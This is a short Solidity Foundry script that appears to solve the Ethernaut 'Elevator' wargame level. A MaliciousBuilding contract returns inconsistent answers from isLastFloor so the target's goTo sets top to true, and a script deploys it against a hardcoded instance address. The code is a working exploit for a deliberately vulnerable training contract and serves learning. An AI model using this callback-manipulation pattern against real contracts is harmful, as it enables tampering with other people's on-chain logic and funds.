// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "../../src/Ethernaut/elevator.sol";

contract MaliciousBuilding is Building {
    Elevator private elevator;
    bool private isSecondCall = false;

    constructor(address _elevatorAddress) {
        elevator = Elevator(_elevatorAddress);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!isSecondCall) {
            isSecondCall = true;
            return false;
        }
        return true;
    }

    function attack(uint256 _floor) external {
        elevator.goTo(_floor);
    }
}

contract ElevatorExploit is Script {
    Elevator elevator;
    MaliciousBuilding maliciousBuilding;

    function setUp() public {
        elevator = Elevator(0xe33Fb62B2ae208a833967Dd13bCD8670235C64Ae);
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        maliciousBuilding = new MaliciousBuilding(address(elevator));
        maliciousBuilding.attack(1);

        console2.log("Is top?", elevator.top());
        console2.log("Current floor:", elevator.floor());

        vm.stopBroadcast();
    }
}
